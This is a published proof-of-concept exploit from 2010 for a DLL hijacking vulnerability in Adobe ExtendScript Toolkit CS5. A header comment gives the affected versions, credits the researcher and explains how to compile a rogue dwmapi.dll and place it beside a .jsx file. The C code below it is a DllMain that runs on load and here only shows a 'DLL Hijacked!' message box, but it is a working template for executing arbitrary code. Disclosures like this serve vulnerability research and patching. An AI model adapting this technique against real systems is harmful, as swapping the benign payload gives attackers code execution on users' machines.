/*

 Adobe ExtendedScript Toolkit CS5 v3.5.0.52 (dwmapi.dll) DLL Hijacking Exploit

 Vendor: Adobe Systems Inc.
 Product Web Page: http://www.adobe.com
 Affected Version: CS5 v3.5.0.52 ExtendScript 4.1.23 ScriptUI 5.1.37

 Summary: The ExtendScript Toolkit (ESTK) 3.5.0 is a scripting utility
 included with Adobe� Creative Suite CS5 and other Adobe applications.
 The ESTK is used for creating, editing, and debugging JavaScript to be
 used for scripting Adobe applications.

 Desc: Adobe ExtendScript Toolkit CS5 suffers from a dll hijacking vulnerability
 that enables the attacker to execute arbitrary code on a local level. The
 vulnerable extension is .jsx thru dwmapi.dll library.

 ----
 gcc -shared -o dwmapi.dll adobeest.c

 Compile and rename to dwmapi.dll, create a file test.jsx and put both files
 in same dir and execute.
 ----

 Tested on Microsoft Windows XP Professional SP3 (EN)



 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
 liquidworm gmail com

 Zero Science Lab - http://www.zeroscience.mk


 25.08.2010

*/


#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		dll_mll();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

int dll_mll()
{
	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}